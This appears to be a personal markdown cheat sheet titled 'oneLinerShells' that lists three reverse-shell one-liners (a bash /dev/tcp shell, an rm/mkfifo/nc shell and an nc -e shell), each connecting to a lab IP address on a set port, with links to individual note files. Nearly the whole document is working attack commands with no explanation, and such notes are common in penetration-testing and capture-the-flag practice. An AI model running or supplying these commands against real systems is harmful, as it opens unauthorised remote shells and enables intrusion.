---
title: "oneLinerShells"
tags:
  - fetus
---
## bash:
```sh
bash -i >& /dev/tcp/192.168.48.128/1337 0>&1
```
## rm:
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.48.128 1777 >/tmp/f
```
## nc:
```sh
nc -e /bin/bash 192.168.48.128 1337
```
#### individual files cuz why not
- [[oneLinerRmShell]] 
- [[oneLinerBashShell]] 